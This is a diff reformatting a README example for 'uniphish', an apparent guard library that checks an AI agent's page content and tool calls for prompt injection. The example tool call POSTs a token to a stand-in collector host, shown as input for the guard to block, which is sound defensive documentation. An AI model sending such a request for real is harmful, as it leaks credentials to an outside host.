@@ -32,7 +32,8 @@ agent triaging a mailbox or a download can use the whole platform.
 import asyncio
 from uniphish.agent import AgentGuard, GuardPolicy
 
-guard = AgentGuard(policy=GuardPolicy(strict=False))   # offline by default
+guard = AgentGuard(policy=GuardPolicy(strict=False))  # offline by default
+
 
 async def main():
     # 1. before browsing
@@ -44,11 +45,13 @@ async def main():
     page = open("fetched.html", encoding="utf-8").read()
     d = await guard.check_content(page, kind="page", source="https://shop.example/pricing")
     if d.action == "block":
-        context = d.sanitized          # fenced, injection spans removed, still readable as data
+        context = d.sanitized  # fenced, injection spans removed, still readable as data
     # 3. before executing a proposed tool call
-    d = await guard.check_tool_call("http_request",
-            {"url": "https://collector.example/in?token=abc123", "method": "POST"})
+    d = await guard.check_tool_call(
+        "http_request", {"url": "https://collector.example/in?token=abc123", "method": "POST"}
+    )
     print(d.action, d.reasons)
+
 
 asyncio.run(main())
 ```
